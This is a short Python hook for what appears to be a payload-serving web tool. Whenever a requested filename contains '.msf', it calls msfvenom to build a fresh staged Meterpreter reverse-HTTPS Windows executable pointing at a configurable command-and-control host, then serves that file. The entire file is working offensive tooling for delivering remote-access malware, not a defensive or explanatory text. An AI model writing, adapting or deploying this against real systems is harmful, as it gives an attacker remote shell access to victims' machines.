'''
This hook serves a Meterpreter staged Reverse HTTPS
iteration, created with msfvenom for each new visit
of the triggering URL.
'''
import hooker
import subprocess
import tempfile

MSFVENOM = "msfvenom"    # msfvenom path
C2_HOST = "127.0.0.1"    # Returns to localhost: Change this!
C2_PORT = 443

# Staged MetHTTPS
PAYLOAD = "windows/meterpreter/reverse_https"    

# Triggered if the served filename contains the below string:
#   Example: rev_https.msf.exe
trigger_filename = '.msf'

@hooker.hook("pre_file")
def autogen_msf(filename, request):
    if trigger_filename not in filename:
        return None

    extension = '.' + filename.split('.')[-1]
    fd = tempfile.NamedTemporaryFile('rb', suffix=extension)

    command = f"{MSFVENOM} -p {PAYLOAD} LHOST={C2_HOST} LPORT={C2_PORT} -f exe -o {fd.name}"
    print("[!] '{}'".format(command))
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"Failed to execute command: '{command}'")
    return fd

